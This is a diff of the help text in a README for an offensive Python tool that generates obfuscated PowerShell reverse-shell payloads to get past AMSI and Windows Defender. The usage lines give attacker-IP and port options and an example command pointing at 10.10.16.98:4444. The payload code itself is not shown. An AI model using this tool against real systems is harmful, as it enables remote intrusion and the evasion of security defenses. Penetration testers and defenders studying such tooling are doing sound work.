@@ -44,29 +44,23 @@ Executing it on the victim machine will make a request to the HTTP server expose
 
 ## Help message
 ```shell-session
-❯ python3 BypassAMSI_PSRevshell.py server -h
+❯ python3 BypassAMSI_PSRevshell.py revshell -h
 
-usage: python3 BypassAMSI_PSRevshell.py server [-h] -i ATTACKER_IP -p PORT [--server-port SERVER_PORT] [-o OUTFILE] [-v] [--keep-pwd] [--keep-file] [--enc-b64]
-                                               [--no-banner]
+usage: python3 BypassAMSI_PSRevshell.py revshell [-h] -i ATTACKER_IP -p PORT [-v] [--keep-pwd] [--enc-b64] [--no-banner]
 
 Generate an obfuscated PowerShell payload to avoid Windows Defender
 
 options:
   -h, --help            show this help message and exit
   -i ATTACKER_IP, --attacker-ip ATTACKER_IP
-                        Attacker IP address serving temporal HTTP server.
-  -p PORT, --port PORT  Listening port to get reverse shell.
-  --server-port SERVER_PORT
-                        Port serving temporal HTTP server. Default: 8000.
-  -o OUTFILE, --outfile OUTFILE
-                        Name of the temporal PowerShell file storing obfuscated payload. Default: revshell.ps1
+                        Attacker IP address.
+  -p PORT, --port PORT  Port to get revshell.
   -v, --verbose         Display payloads used and generated, along with some extra info.
   --keep-pwd            Revshell obtained will show working directory/path. Keeping this might trigger AMSI/Defender.
-  --keep-file           This script will create a file named as "--outfile" flag and then is deleted. Use this flag if you want to keep the generated file/payload.
   --enc-b64             Encode in base64 the Attacker IP address and port provided to the payload.
   --no-banner           Do not print script banner.
 
-Example: BypassAMSI_PSRevshell.py server -i 10.10.16.98
+Example: BypassAMSI_PSRevshell.py revshell -i 10.10.16.98 -p 4444
 ```
 
 ```shell-session
